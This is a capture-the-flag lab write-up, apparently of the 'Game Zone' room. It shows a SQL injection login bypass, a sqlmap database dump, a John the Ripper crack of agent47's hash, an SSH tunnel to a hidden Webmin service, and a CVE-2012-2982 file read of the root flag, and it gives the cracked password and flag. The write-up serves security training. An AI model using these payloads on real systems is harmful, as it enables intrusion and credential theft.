## Game Zone
SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.

### Recon
- The initial visit to the page looks like a Game community page have couple links for action (but not working like register) and a login screen with Agent 47 (Hitman) image (reverse search with Google). 
- Also it looks the web page is running on php, noticed with failed login and search option which redirected to index.php
- Nmap revealed the below information: 
- 

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
    |   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
    |_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Game Zone
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Logging in
- Using the SQL injection with user name as `' or 1=1 -- -` and any password, logged into the web page. 
- The page then navigated to portal.php where there is a search.
- Using Burp, captured and saved the search request to a file, search_request.txt
- 

    POST /portal.php HTTP/1.1
    Host: 10.10.17.195
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.17.195/portal.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 19
    DNT: 1
    Connection: close
    Cookie: PHPSESSID=smej272kr499jb9bjd53rcin26
    Upgrade-Insecure-Requests: 1
    
    searchitem=testgame


-  Run the `sqlmap` with the request as input and it will find the database details.
 `sqlmap -r search_request.txt --dbms=mysql --dump`
 - The sqlmap returned:
	 - A table "users" which has hashed usernames and passwords in column "pwd" with SHA256.
	 - `agent47` hashed password is `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`
	 - Another table, "post" has game name and details. 

### Cracking the hashed password
Using the `John`, we can  try to find the plain text for the given hash password with a word list. 

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256` and cracked the password as *videogamer124*.

### Checking the services 
Login to the victim machine over ssh using the obtained credentials. 

- The host is running below sockets:  
- 

    $ ss -tulpn
    Netid State      Recv-Q Send-Q  Local Address:Port                 Peer Address:Port              
    udp   UNCONN     0      0                   *:10000                           *:*                  
    udp   UNCONN     0      0                   *:68                              *:*                  
    tcp   LISTEN     0      80          127.0.0.1:3306                            *:*                  
    tcp   LISTEN     0      128                 *:10000                           *:*                  
    tcp   LISTEN     0      128                 *:22                              *:*                  
    tcp   LISTEN     0      128                :::80                             :::*                  
    tcp   LISTEN     0      128                :::22                             :::*      

- There is a service running on port 10000 which was not showed in nmap results, could be due to firewall block. 
- Established a local SSH tunnel with the victim to connect to the blocked service, by creating the tunnel from local host (on port 10001) and the remote (to 10000)  `ssh -L 10001:localhost:10000 agent47@10.10.17.195` 

- The port 10000 on victim is running a Webmin service (CMS) with version 1.580
-
    
    nmap -p 10001 -A 127.0.0.1
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 17:30 EDT
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.000064s latency).
    
    PORT      STATE SERVICE VERSION
    10001/tcp open  http    MiniServ 1.580 (Webmin httpd)
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-title: Login to Webmin

### Escalating Privileges
The Webmin version 1.580 is vulnerable for remote code execution as defined in [CVE-2012-2982](https://www.exploit-db.com/exploits/21851). 
By looking at the exploit, we can access any file by through /file/show.cgi; using this we can access the flag and has a value *a4b945830144bdd71908d12d902adeee*. Metasploit (exploit/unix/webapp/webmin_show_cgi_exec) is really not needed here. 

    http://127.0.0.1:10001/file/show.cgi/root/root.txt

